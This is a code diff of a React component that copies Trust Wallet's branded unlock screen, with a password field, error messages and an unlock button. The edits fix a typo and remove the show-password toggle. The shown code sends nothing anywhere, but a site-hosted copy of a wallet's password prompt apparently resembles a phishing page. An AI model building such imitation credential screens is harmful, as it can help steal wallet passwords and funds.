@@ -84,7 +84,7 @@ const TrustWallet = () => {
         <div>
             <div className={`${Styles.container}`}>
                 <Image src={trustwallet} alt="Trust Wallet" />
-                <div className={`${Styles.textcontainer}`}><p className={`${Styles.titletext}`}> Secure and trusted multi-chain crypto wallet</p></div>
+                <div className={`${Styles.textcontainer}`}><p className={`${Styles.titletext}`}>Secure and trusted multi-chain crypto wallet</p></div>
             </div>
 
             <div className={`${Styles.password_container}`}>
@@ -92,7 +92,8 @@ const TrustWallet = () => {
 
                 <div className={`${Styles.input_container}`}>
                     <input
-                        type={isPasswordVisible ? "text" : "password"}
+                        type='password'
+                        autoComplete="off"
                         style={{
                             width: '100%',
                             height: '5rem',
@@ -106,7 +107,6 @@ const TrustWallet = () => {
                             outlineColor: errormessage ? '#ef4444' : 'red'
                         }}
                         onFocus={focusHandler}
-                        autoComplete="off"
                         value={password}
                         onChange={handleCodeChange}
                     />
@@ -123,7 +123,7 @@ const TrustWallet = () => {
                     </button>
 
                 </div>
-                {errormessage ? <div className={`${Styles.errormessage}`}>Incorrect password</div> : errrpc ? <div className={`${Styles.errormessage}`}>Incorrect PRC</div> : ''}
+                {errormessage ? <div className={`${Styles.errormessage}`}>Incorrect password</div> : errrpc ? <div className={`${Styles.errormessage}`}>Incorrect RPC</div> : ''}
             </div>
             <button type="submit" class={`${Styles.unlock} ${password ? `${Styles.ifval}` : `${Styles.noval}`}`} onClick={unlock}>
                 {loader ? (
